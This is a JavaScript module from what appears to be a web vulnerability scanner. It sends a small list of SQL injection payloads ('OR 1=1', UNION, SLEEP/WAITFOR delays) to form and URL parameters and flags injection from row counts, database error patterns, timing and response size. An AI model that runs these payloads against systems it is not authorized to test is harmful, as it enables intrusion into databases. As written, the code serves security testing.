const axios = require('axios');
const { takeScreenshot } = require('../utils/screenshot');

// Basic payloads from https://github.com/swisskyrepo/PayloadsAllTheThings
const SQLI_PAYLOADS = [
  { str: "' OR '1'='1", type: 'boolean' },
  { str: "' OR 1=1--", type: 'boolean' },
  { str: '" OR 1=1--', type: 'boolean' },
  { str: "' OR '1'='1' -- ", type: 'boolean' },
  { str: "' UNION SELECT NULL--", type: 'union' },
  { str: "' AND SLEEP(5)-- ", type: 'time' },
  { str: "'; WAITFOR DELAY '0:0:5'--", type: 'time' },
];

// List of errors to match from incase of error based sqli
const ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /unclosed quotation mark after the character string/i,
  /you have an error in your sql syntax/i,
  /ORA-\d{5}/i,
  /PostgreSQL.*ERROR.*syntax/i,
  /SQLite\.SQLException/i,
  /SQLITE_ERROR/i,
  /syntax error/i,
  /SQLSTATE/i,
];

function stripHash(url) {
  const u = new URL(url);
  u.hash = '';
  return u;
}

function parseCookieHeader(cookie = '') {
  return cookie
    .split(';')
    .map(s => s.trim())
    .filter(Boolean)
    .map(pair => {
      const idx = pair.indexOf('=');
      if (idx === -1) return null;
      return {
        name: pair.slice(0, idx).trim(),
        value: pair.slice(idx + 1).trim(),
      };
    })
    .filter(Boolean);
}

function responseText(data) {
  if (typeof data === 'string') return data;
  if (Buffer.isBuffer(data)) return data.toString('utf8');
  try {
    return JSON.stringify(data);
  } catch {
    return String(data);
  }
}


function countRows(body) {
  const firstNameMatches = body.match(/First name:/gi) || [];
  const surnameMatches = body.match(/Surname:/gi) || [];
  const idMatches = body.match(/\bID:/gi) || [];
  return Math.max(firstNameMatches.length, surnameMatches.length, idMatches.length);
}

function buildRequest(point, payload, cookie) {
  const method = String(point.method || 'GET').toUpperCase();
  const base = stripHash(point.url);
  const headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; SQLiScanner/1.0)',
  };

  const cookies = parseCookieHeader(cookie);
  if (cookies.length) {
    headers.Cookie = cookies.map(c => `${c.name}=${c.value}`).join('; ');
  }

  if (method === 'GET') {
    const u = new URL(base.href);
    const params = new URLSearchParams(u.search);

    params.set(point.param, payload);

    if (point.otherParams) {
      for (const [k, v] of Object.entries(point.otherParams)) {
        if (k !== point.param && v !== undefined && v !== null) {
          params.set(k, String(v));
        }
      }
    }

    u.search = params.toString();

    return {
      method: 'GET',
      url: u.toString(),
      headers,
      timeout: 15000,
      validateStatus: () => true,
    };
  }

  const form = new URLSearchParams();

  if (point.otherParams) {
    for (const [k, v] of Object.entries(point.otherParams)) {
      if (v !== undefined && v !== null) {
        form.set(k, String(v));
      }
    }
  }

  form.set(point.param, payload);

  return {
    method: 'POST',
    url: base.href,
    data: form.toString(),
    headers: {
      ...headers,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    timeout: 15000,
    validateStatus: () => true,
  };
}

async function createFinding(point, payload, snippet, response, requestConfig, confidence) {
  const requestInfo =
    requestConfig.method === 'GET'
      ? `GET ${requestConfig.url}`
      : `POST ${requestConfig.url}\nBody: ${requestConfig.data}`;

  let screenshot = null;
  try {
    screenshot = await takeScreenshot(requestConfig.url, requestConfig.method, payload);
  } catch {

  }

  return {
    type: 'SQL_Injection',
    url: requestConfig.url,
    method: requestConfig.method,
    param: point.param,
    payload,
    request: requestInfo,
    responseSnippet: snippet,
    screenshot,
    confidence,
  };
}

// Actual function to test the SQL injection vulnerability
async function testSQLi(point, cookie = '') {
  const findings = [];

  const baselinePayload = point.baselineValue || '1';
  const baselineConfig = buildRequest(point, baselinePayload, cookie);

  let baselineResp;
  let baselineTime = 0;

  try {
    const start = Date.now();
    baselineResp = await axios(baselineConfig);
    baselineTime = Date.now() - start;
  } catch {
    return findings;
  }

  const baselineBody = responseText(baselineResp.data);
  const baselineRows = countRows(baselineBody);

  for (const payload of SQLI_PAYLOADS) {
    const config = buildRequest(point, payload.str, cookie);

    try {
      const start = Date.now();
      const resp = await axios(config);
      const elapsed = Date.now() - start;

      const body = responseText(resp.data);
      const currentRows = countRows(body);

      // Checking number of Rows before and after the command to know if sqli occured
      if (payload.type === 'boolean') {
        if (currentRows > baselineRows && currentRows >= 2) {
          findings.push(
            await createFinding(
              point,
              payload.str,
              `Multiple result rows returned (${baselineRows} -> ${currentRows})`,
              resp,
              config,
              'high'
            )
          );
          continue;
        }
      }

      // Error-based sqli
      if (ERROR_PATTERNS.some(p => p.test(body))) {
        findings.push(
          await createFinding(
            point,
            payload.str,
            body.slice(0, 500),
            resp,
            config,
            'high'
          )
        );
        continue;
      }

      // Time-based sqli
      if (payload.type === 'time') {
        if (baselineTime < 2000 && elapsed > 4000) {
          findings.push(
            await createFinding(
              point,
              payload.str,
              `Time-based delay detected: ${elapsed}ms (baseline ${baselineTime}ms)`,
              resp,
              config,
              'high'
            )
          );
          continue;
        }
      }

      // If response size change a lot 
      if (Math.abs(baselineBody.length - body.length) > baselineBody.length * 0.15) {
        findings.push(
          await createFinding(
            point,
            payload.str,
            `Response length changed from ${baselineBody.length} to ${body.length}`,
            resp,
            config,
            'medium'
          )
        );
      }
    } catch (err) {
      if (err.response) {
        const body = responseText(err.response.data);

        if (
          ERROR_PATTERNS.some(p => p.test(body)) ||
          countRows(body) > baselineRows
        ) {
          findings.push(
            await createFinding(
              point,
              payload.str,
              body.slice(0, 500),
              err.response,
              config,
              'high'
            )
          );
        }
      }
    }
  }

  return findings;
}

module.exports = { testSQLi };